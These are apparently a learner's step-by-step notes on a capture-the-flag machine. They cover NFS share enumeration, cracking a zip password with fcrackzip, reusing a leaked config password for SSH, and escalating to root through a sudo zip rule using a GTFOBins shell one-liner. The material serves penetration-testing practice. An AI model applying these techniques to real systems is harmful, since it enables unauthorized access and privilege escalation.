- 1 - Scan with Nmap
- 2 - Notice the port 2049 is operation nfs_acl (Much like samba is a network file share)
- 3 - we can check the directory that is being used for the share system using "showmount -e "192.168.0.35" and we find a path "/srv/nfs 172.16.0.0/12,10.0.0.0/8,192.168.0.0/16"
- 4 - We can now moutn this directory into our machine using "sudo mount -t nfs 192.168.0.35:/srv/nfs /mnt/dev" and we now have a save.zip file in our machine from the target machine using the file share system. 
- 5 - We can unzip using "unzip save.zip" but we require a password. 
- 6 - We can install a tool called "fcrackzip" using "sudo apt install fcrackzip" and find the password using "fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt save.zip" and we find the password being "java101" and we have the files "id_rsa" and "todo.txt"
- 7 - we can try connecting via ssh using the "ssh -i id_rsa jpª192.168.0.35" but we need a password (used jp because the todo.txt is signed by "jp").
- 8 - Using Dirbuster we can list the directories of both port 80 and port 8080.
	- For Port 80 we find a directory called app. 
		- app/config/configuration.yml containing password and username for a database (see notes).
	-  Port 8080 - dev
		- A dev website being ran using boltwire
- 9 -We can seacrh online "boltwire exploit" and we find  https://www.exploit-db.com/exploits/48411
	- We need to be authenticated to use this exploit.
	- We find that the only user appart form root is "jeanpaul"
- 10 - We can re attemp to login using ssh "ssh -i id_rsa jeanpaulª192.168.0.35" and try the password from the configuration.yml file "I_love_java" and we log in. 
- 11 - Good thing to look at when login in as a low level user:
	- "history" - someone cleaned the history 
		- echo "" > .bash_history 
	- "sudo -l" - we can use zip.
		- We check User jeanpaul may run the following commands on dev:
		    (root) NOPASSWD: /usr/bin/zip
- 12 - Now we know that we can use "zip", but how can we use it to escalate our previlages? We can use GTFOBins https://gtfobins.github.io/ 
	- We click on SUDO (because we can use sudo for zip) and search for zip. https://gtfobins.github.io/gtfobins/zip/
- 13 - We find on that page the Sudo section and there is code to be copied and used. When using the code we enter in a shell with root previlages and are able to cat the flag on root directory. 
	"  TF=$(mktemp -u)
	 sudo zip $TF /etc/hosts -T -TT 'sh #' "
